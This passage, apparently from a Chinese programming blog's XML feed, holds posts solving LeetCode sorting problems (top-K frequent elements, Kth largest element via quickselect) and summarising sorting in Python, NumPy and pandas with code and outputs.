class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">topKFrequent</span><span class="params">(self, nums, k)</span>:</span><span class="comment"># nums:List[int],k:int</span></span><br><span class="line">        dic =dict()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> dic.keys():</span><br><span class="line">                dic[i] +=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dic[i]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        new_list= sorted(dic.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line">        tmp=[]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> new_list[-k:]:</span><br><span class="line">            tmp.append(i[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = Solution()</span><br><span class="line">nums = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">k = <span class="number">2</span></span><br><span class="line">a.topKFrequent(nums,k)</span><br></pre></td></tr></table></figure><pre><code>[2, 1]</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【排序】215.数组中的第K个最大的元素</title>
      <link href="2021/03/04/LeetCode-G-%E6%8E%92%E5%BA%8F-215.%20%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E7%AC%ACK%E4%B8%AA%E6%9C%80%E5%A4%A7%E5%85%83%E7%B4%A0/"/>
      <url>2021/03/04/LeetCode-G-%E6%8E%92%E5%BA%8F-215.%20%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E7%AC%ACK%E4%B8%AA%E6%9C%80%E5%A4%A7%E5%85%83%E7%B4%A0/</url>
      
        <content type="html"><![CDATA[<p>快速选择</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>在未排序的数组中找到第 k 个最大的元素。请注意，你需要找的是数组排序后的第 k 个最大的元素，而不是第 k 个不同的元素。</p><p>示例1：</p><pre><code>输入: [3,2,1,5,6,4] 和 k = 2输出: 5</code></pre><p>示例2：</p><pre><code>输入: [3,2,3,1,2,4,5,5,6] 和 k = 4输出: 4</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法一：暴力解法"><a href="#方法一：暴力解法" class="headerlink" title="方法一：暴力解法"></a>方法一：暴力解法</h3><p>思路：进行完整的排序，再从右至左输出第n-k个元素</p><p>进行快速排序后<br>    - 时间复杂度：O(nlogn)<br>    - 空间复杂度：O(1)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findKthLargest</span><span class="params">(self, nums, k)</span> -&gt; int:</span></span><br><span class="line">        self.quick_sort(nums,<span class="number">0</span>,len(nums))</span><br><span class="line">        <span class="keyword">return</span> nums[len(nums)-k]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quick_sort</span><span class="params">(self,nums,lo,hi)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> lo+<span class="number">1</span>&gt;=hi:</span><br><span class="line">            <span class="keyword">return</span> </span><br><span class="line">        first =lo</span><br><span class="line">        last =hi<span class="number">-1</span></span><br><span class="line">        pivot=nums[first]</span><br><span class="line">        <span class="keyword">while</span> first&lt;last:</span><br><span class="line">            <span class="keyword">while</span> first&lt;last <span class="keyword">and</span> nums[last]&gt;=pivot:</span><br><span class="line">                last = last<span class="number">-1</span></span><br><span class="line">            nums[first]=nums[last]</span><br><span class="line">            <span class="keyword">while</span> first&lt;last <span class="keyword">and</span> nums[first]&lt;=pivot:</span><br><span class="line">                first=first+<span class="number">1</span></span><br><span class="line">            nums[last] = nums[first]</span><br><span class="line">        nums[first]=pivot</span><br><span class="line">        self.quick_sort(nums,lo,first)</span><br><span class="line">        self.quick_sort(nums,first+<span class="number">1</span>,hi)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = Solution()</span><br><span class="line">nums=[<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">k = <span class="number">2</span></span><br><span class="line">a.findKthLargest(nums,k)</span><br></pre></td></tr></table></figure><pre><code>5</code></pre><h3 id="方法二：快速选择"><a href="#方法二：快速选择" class="headerlink" title="方法二：快速选择"></a>方法二：快速选择</h3><p>思路：利用快速排序，每次都能将一个元素放在其既定位置，即每趟：<code>nums[lo:p-1]&lt;nums[p]&lt;nums[p+1:hi]</code>，如此每趟能得出一个p，若p&lt;target=len(nums)-k则说明第k个大的元素在（p和hi之间），反之在（lo和p之间）</p><p>考虑快排对已经有序的排序复杂度高问题，每次选pivot时，随机选</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findKthLargest</span><span class="params">(self, nums, k)</span> -&gt; int:</span></span><br><span class="line">        target = len(nums)-k</span><br><span class="line">        lo = <span class="number">0</span></span><br><span class="line">        hi = len(nums)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span> lo&lt;=hi:</span><br><span class="line">            p = self.partion(nums,lo,hi)</span><br><span class="line">            <span class="keyword">if</span> p&lt;target:</span><br><span class="line">                lo=p+<span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> p&gt;target:</span><br><span class="line">                hi =p<span class="number">-1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> nums[p]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">partion</span><span class="params">(self,nums,lo,hi)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> lo&lt;hi: <span class="comment"># 随机选取pivot</span></span><br><span class="line">            rindex= random.randint(lo,hi)</span><br><span class="line">            nums[lo],nums[rindex]=nums[rindex],nums[lo]</span><br><span class="line">        pivot = nums[lo]</span><br><span class="line">        <span class="keyword">while</span> lo&lt;hi:</span><br><span class="line">            <span class="keyword">while</span> lo&lt;hi <span class="keyword">and</span> nums[hi]&gt;=pivot:</span><br><span class="line">                hi=hi<span class="number">-1</span></span><br><span class="line">            nums[lo]=nums[hi]</span><br><span class="line">            <span class="keyword">while</span> lo&lt;hi <span class="keyword">and</span> nums[lo]&lt;=pivot:</span><br><span class="line">                lo = lo+<span class="number">1</span></span><br><span class="line">            nums[hi]=nums[lo]</span><br><span class="line">        nums[lo]=pivot</span><br><span class="line">        <span class="keyword">return</span> lo</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = Solution()</span><br><span class="line">nums=[<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">k = <span class="number">2</span></span><br><span class="line">a.findKthLargest(nums,k)</span><br></pre></td></tr></table></figure><pre><code>5</code></pre><p>算法导论中提到的快速排序，一趟就分完</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findKthLargest</span><span class="params">(self, nums, k)</span> -&gt; int:</span></span><br><span class="line">        target = len(nums)-k</span><br><span class="line">        lo = <span class="number">0</span></span><br><span class="line">        hi = len(nums)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span> lo&lt;=hi:</span><br><span class="line">            p = self.partion(nums,lo,hi)</span><br><span class="line">            <span class="keyword">if</span> p&lt;target:</span><br><span class="line">                lo=p+<span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> p&gt;target:</span><br><span class="line">                hi =p<span class="number">-1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> nums[p]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">partion</span><span class="params">(self,nums,lo,hi)</span>:</span></span><br><span class="line">        random_index = random.randint(lo,hi)</span><br><span class="line">        nums[random_index],nums[lo]=nums[lo],nums[random_index]</span><br><span class="line">        pivot = nums[lo]</span><br><span class="line">        j=lo</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(lo+<span class="number">1</span>,hi+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> nums[i]&lt;pivot:</span><br><span class="line">                j+= <span class="number">1</span></span><br><span class="line">                nums[i],nums[j]=nums[j],nums[i]</span><br><span class="line">        nums[lo],nums[j]=nums[j],nums[lo]</span><br><span class="line">        <span class="keyword">return</span> j</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = Solution()</span><br><span class="line">nums=[<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">6</span>]</span><br><span class="line">k = <span class="number">2</span></span><br><span class="line">a.findKthLargest(nums,k)</span><br></pre></td></tr></table></figure><pre><code>6</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【python-基础】python中排序方法</title>
      <link href="2021/03/03/Python-A-%E6%8E%92%E5%BA%8F-Python%E4%B8%AD%E6%8E%92%E5%BA%8F%E6%96%B9%E6%B3%95%E5%B0%8F%E7%BB%93/"/>
      <url>2021/03/03/Python-A-%E6%8E%92%E5%BA%8F-Python%E4%B8%AD%E6%8E%92%E5%BA%8F%E6%96%B9%E6%B3%95%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>python中排序简单小结</p><a id="more"></a><h2 id="Python中内置的排序方法"><a href="#Python中内置的排序方法" class="headerlink" title="Python中内置的排序方法"></a>Python中内置的排序方法</h2><ul><li>Python列表中<code>list.sort()</code>方法可直接修改原列表对象排序</li><li><code>sorted()</code>函数对可迭代对象排序并返回新的列表对象</li></ul><h3 id="直接用简单函数进行简单的排序"><a href="#直接用简单函数进行简单的排序" class="headerlink" title="直接用简单函数进行简单的排序"></a>直接用简单函数进行简单的排序</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">5</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">b = sorted(a)</span><br><span class="line">print(a,<span class="string">"\n"</span>,b)</span><br></pre></td></tr></table></figure><pre><code>[5, 3, 2, 1]  [1, 2, 3, 5]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a= [<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>]</span><br><span class="line">a.sort()</span><br><span class="line">a</span><br></pre></td></tr></table></figure><pre><code>[2, 3, 4]</code></pre><h3 id="关键函数排序"><a href="#关键函数排序" class="headerlink" title="关键函数排序"></a>关键函数排序</h3><p><code>list.sort()和sorted()</code>函数都有一个key参数，key形参的值应是函数，他接受一个参数并返回一个用于排序的键</p><p>函数中参数reverse控制升序降序，默认reverse=False,即升序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sorted([<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>]) <span class="comment"># 升序</span></span><br></pre></td></tr></table></figure><pre><code>[1, 3, 4, 5]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sorted([<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>],reverse=<span class="literal">True</span>) <span class="comment"># 降序</span></span><br></pre></td></tr></table></figure><pre><code>[5, 4, 3, 1]</code></pre><p>str.lower按照小写进行排序，忽略大小写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sorted(<span class="string">"This is a test string from Andrew"</span>.split(), key=str.lower)<span class="comment">#</span></span><br></pre></td></tr></table></figure><pre><code>[&apos;a&apos;, &apos;Andrew&apos;, &apos;from&apos;, &apos;is&apos;, &apos;string&apos;, &apos;test&apos;, &apos;This&apos;]</code></pre><p>常使用对象的一些索引作为键对复杂对象进行排序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">student_tuples = [(<span class="string">'john'</span>, <span class="string">'A'</span>, <span class="number">15</span>),(<span class="string">'jane'</span>, <span class="string">'B'</span>, <span class="number">12</span>),(<span class="string">'dave'</span>, <span class="string">'B'</span>, <span class="number">10</span>)]</span><br><span class="line">sorted(student_tuples,key=<span class="keyword">lambda</span> student:student[<span class="number">2</span>])<span class="comment">#按照student的年龄排序</span></span><br></pre></td></tr></table></figure><pre><code>[(&apos;dave&apos;, &apos;B&apos;, 10), (&apos;jane&apos;, &apos;B&apos;, 12), (&apos;john&apos;, &apos;A&apos;, 15)]</code></pre><p>同样的方法也可以用于命名属性的对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, grade, age)</span>:</span></span><br><span class="line">                self.name = name</span><br><span class="line">                self.grade = grade</span><br><span class="line">                self.age = age</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">                <span class="keyword">return</span> repr((self.name, self.grade, self.age))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">student_objects = [</span><br><span class="line">        Student(<span class="string">'john'</span>, <span class="string">'A'</span>, <span class="number">15</span>),</span><br><span class="line">        Student(<span class="string">'jane'</span>, <span class="string">'B'</span>, <span class="number">12</span>),</span><br><span class="line">        Student(<span class="string">'dave'</span>, <span class="string">'B'</span>, <span class="number">10</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sorted(student_objects, key=<span class="keyword">lambda</span> student: student.age)   <span class="comment"># sort by age</span></span><br></pre></td></tr></table></figure><pre><code>[(&apos;dave&apos;, &apos;B&apos;, 10), (&apos;jane&apos;, &apos;B&apos;, 12), (&apos;john&apos;, &apos;A&apos;, 15)]</code></pre><h3 id="Operator函数块"><a href="#Operator函数块" class="headerlink" title="Operator函数块"></a>Operator函数块</h3><p>可以利用Operator的访问器功能更容易、快捷，将<code>operator模块的itemgetter()、attrgetter()、methodcaller()函数作为sorted()</code>的键函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> itemgetter, attrgetter</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sorted(student_tuples,key=itemgetter(<span class="number">2</span>))</span><br></pre></td></tr></table></figure><pre><code>[(&apos;dave&apos;, &apos;B&apos;, 10), (&apos;jane&apos;, &apos;B&apos;, 12), (&apos;john&apos;, &apos;A&apos;, 15)]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sorted(student_objects, key=attrgetter(<span class="string">'age'</span>))</span><br></pre></td></tr></table></figure><pre><code>[(&apos;dave&apos;, &apos;B&apos;, 10), (&apos;jane&apos;, &apos;B&apos;, 12), (&apos;john&apos;, &apos;A&apos;, 15)]</code></pre><p>可以对多个关键字进行排序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sorted(student_tuples, key=itemgetter(<span class="number">1</span>,<span class="number">2</span>))</span><br></pre></td></tr></table></figure><pre><code>[(&apos;john&apos;, &apos;A&apos;, 15), (&apos;dave&apos;, &apos;B&apos;, 10), (&apos;jane&apos;, &apos;B&apos;, 12)]</code></pre><h2 id="Numpy中数组排序"><a href="#Numpy中数组排序" class="headerlink" title="Numpy中数组排序"></a>Numpy中数组排序</h2><h3 id="直接排序"><a href="#直接排序" class="headerlink" title="直接排序"></a>直接排序</h3><p>和python内建的列表类型相似，Numpy数组可以使用sort方法按位置排序,np.sort方法返回的是已经排好序的数组拷贝，而不是对原数组的原位置排序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arr=  np.random.randn(<span class="number">3</span>)</span><br><span class="line">arr</span><br></pre></td></tr></table></figure><pre><code>array([-1.35092935, -0.58342412, -0.8207302 ])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arr.sort()</span><br><span class="line">arr</span><br></pre></td></tr></table></figure><pre><code>array([-1.35092935, -0.8207302 , -0.58342412])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 对二维数组 排序，按轴排序</span></span><br><span class="line">arr1 = np.random.randn(<span class="number">5</span>,<span class="number">3</span>)</span><br><span class="line">arr1</span><br></pre></td></tr></table></figure><pre><code>array([[ 1.80974897, -0.31702384,  0.39830353],       [-0.96726721,  0.38100404,  0.31633181],       [ 0.47419492, -0.44129861,  0.47946414],       [ 1.12581458,  0.43486315, -1.99929904],       [ 1.19119537,  1.24635077, -1.26876347]])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arr1.sort(<span class="number">1</span>)</span><br><span class="line">arr1</span><br></pre></td></tr></table></figure><pre><code>array([[-0.31702384,  0.39830353,  1.80974897],       [-0.96726721,  0.31633181,  0.38100404],       [-0.44129861,  0.47419492,  0.47946414],       [-1.99929904,  0.43486315,  1.12581458],       [-1.26876347,  1.19119537,  1.24635077]])</code></pre><h3 id="间接排序"><a href="#间接排序" class="headerlink" title="间接排序"></a>间接排序</h3><p>在数据排序中，可能需要通过一个或多个键对数据进行排序，比如给定学生的数据，需要先按班级排序，再成绩排序，这是间接排序。</p><p>Numpy中提供了两个方法：argsort() 和 numpy.lexsort(), 可以先获得整数索引数组(索引器)，索引数组的元素是原数组中相应元素的索引，然后将原数组重新排列成索引数组指定的顺序。</p><p>argsort()函数是将原始数组中的元素从小到大排列，提取其对应的index(索引</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arr2= np.array([<span class="number">5</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>])</span><br><span class="line">arr2</span><br></pre></td></tr></table></figure><pre><code>array([5, 0, 1, 3, 2])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index = arr2.argsort()</span><br><span class="line">index</span><br></pre></td></tr></table></figure><pre><code>array([1, 2, 4, 3, 0], dtype=int64)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr2[index]</span><br></pre></td></tr></table></figure><pre><code>array([0, 1, 2, 3, 5])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 二维数组</span></span><br><span class="line">arr3= np.random.randn(<span class="number">5</span>,<span class="number">3</span>)</span><br><span class="line">arr3</span><br></pre></td></tr></table></figure><pre><code>array([[ 0.50369183, -0.14320525,  1.17931436],       [-0.46240806,  1.1170554 , -0.17238359],       [ 0.59020501, -0.71495542, -0.97350068],       [-0.40442428, -1.09054876, -0.71871284],       [-2.43518373,  0.90166379, -0.39092172]])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index0 = arr3.argsort(axis =<span class="number">0</span>)<span class="comment"># 列方向上排序</span></span><br><span class="line">index0</span><br></pre></td></tr></table></figure><pre><code>array([[4, 3, 2],       [1, 2, 3],       [3, 0, 4],       [0, 4, 1],       [2, 1, 0]], dtype=int64)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index1 =arr3.argsort(axis = <span class="number">1</span>)<span class="comment"># 行方向上排序</span></span><br><span class="line">index1</span><br></pre></td></tr></table></figure><pre><code>array([[1, 0, 2],       [0, 2, 1],       [2, 1, 0],       [1, 2, 0],       [0, 2, 1]], dtype=int64)</code></pre><h2 id="Pandas中的排序"><a href="#Pandas中的排序" class="headerlink" title="Pandas中的排序"></a>Pandas中的排序</h2><p>在Pandas中有两种排序方式，按索引排序：sort_index()；按值排序：sort_values()。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Series</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">ser = pd.Series(range(<span class="number">5</span>),index=[<span class="string">'a'</span>,<span class="string">'e'</span>,<span class="string">'d'</span>,<span class="string">'s'</span>,<span class="string">'o'</span>])</span><br><span class="line">ser</span><br></pre></td></tr></table></figure><pre><code>a    0e    1d    2s    3o    4dtype: int64</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ser.sort_index()</span><br></pre></td></tr></table></figure><pre><code>a    0d    2e    1o    4s    3dtype: int64</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># DataFrame</span></span><br><span class="line">df = pd.DataFrame(np.arange(<span class="number">8</span>).reshape((<span class="number">2</span>,<span class="number">4</span>)),index = [<span class="string">'one'</span>,<span class="string">'three'</span>],columns = [<span class="string">'d'</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>])</span><br><span class="line">df</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>d</th>      <th>a</th>      <th>b</th>      <th>c</th>    </tr>  </thead>  <tbody>    <tr>      <td>one</td>      <td>0</td>      <td>1</td>      <td>2</td>      <td>3</td>    </tr>    <tr>      <td>three</td>      <td>4</td>      <td>5</td>      <td>6</td>      <td>7</td>    </tr>  </tbody></table></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.sort_index(axis = <span class="number">1</span>, ascending = <span class="literal">False</span>)</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>d</th>      <th>c</th>      <th>b</th>      <th>a</th>    </tr>  </thead>  <tbody>    <tr>      <td>one</td>      <td>0</td>      <td>3</td>      <td>2</td>      <td>1</td>    </tr>    <tr>      <td>three</td>      <td>4</td>      <td>7</td>      <td>6</td>      <td>5</td>    </tr>  </tbody></table></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.sort_values(axis = <span class="number">0</span>, ascending = <span class="literal">False</span>, by = [<span class="string">'a'</span>,<span class="string">'c'</span>])</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>d</th>      <th>a</th>      <th>b</th>      <th>c</th>    </tr>  </thead>  <tbody>    <tr>      <td>three</td>      <td>4</td>      <td>5</td>      <td>6</td>      <td>7</td>    </tr>    <tr>      <td>one</td>      <td>0</td>      <td>1</td>      <td>2</td>      <td>3</td>    </tr>  </tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【排序】常用排序算法</title>
      <link href="2021/03/02/LeetCode-G-%E6%8E%92%E5%BA%8F-%E5%B8%B8%E7%94%A8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
      <url>2021/03/02/LeetCode-G-%E6%8E%92%E5%BA%8F-%E5%B8%B8%E7%94%A8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
      
